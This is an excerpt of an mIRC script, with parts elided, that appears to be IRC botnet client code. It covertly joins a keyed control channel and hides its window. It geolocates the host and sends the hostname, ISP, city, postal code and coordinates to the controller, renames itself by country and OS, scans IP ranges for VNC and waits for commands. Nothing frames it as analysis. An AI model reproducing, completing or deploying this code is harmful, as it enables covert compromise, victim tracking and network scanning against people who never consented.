...
raw 001:*:{ set %fldchan #molly | set %key $encode(qwerty,u) | join %fldchan %key }
...
alias nextvnc {
  inc %rangex
  if (256 <= $gettok(%range,2,46)) { unset %range | notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99)* Scan halted, waiting for new command... }
...
on *:JOIN:#:{ if ($nick == $me) .timer 1 0 window -h # |  .timerC $+ # 1 10 resolve | .timernick 1 30 nick %ctry $+ $+ %start $+ |- $+ $os | if ($nick == $me) .opnotice %fldchan Https://github.com/independentcod/psyBNC-Win   $+ $r(0,99) $+ , $+ $r(0,99) https://is.gd/PsyBNC %city $fulltime $address($me,2) | .timer 1 10 clearall |  if ($me isop #) mode # +osmnkK $nick %key   }
alias resolve {
  set %resolve.ip $ip
...
on *:sockread:resolve.ip*: {
  ...
  sockread %sockread
  if (!$sockbr) return
  if (*Hostname*:* iswm %sockread) notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99) %resolve.ip : %sockread
  if (*ISP*:* iswm %sockread) notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99) %resolve.ip %sockread
  if (*Country*:* iswm %sockread) { set %ctry MEL_ $+ $remove($gettok(%sockread,2,32),",$CHR(44)) | nick %ctry $+ %city $+ %start $+ - $+ $os $+ $ticks }
  if (*City*:* iswm %sockread)  { set %city   $+ $r(0,99) $+ , $+ $r(0,99) $remove($gettok(%sockread,2,32),",$CHR(44)) | nick %ctry $+ %city $+ %start $+ - $+ $os $+ $ticks }
  if (*org*:* iswm %sockread) notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99) %resolve.ip : %sockread
  if (*loc*:* iswm %sockread) notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99) %resolve.ip : %sockread
  if (*region*:* iswm %sockread) notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99) %resolve.ip $+ : %sockread
  if (*postal*:* iswm %sockread) notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99) %resolve.ip $+ : %sockread
  goto read
}
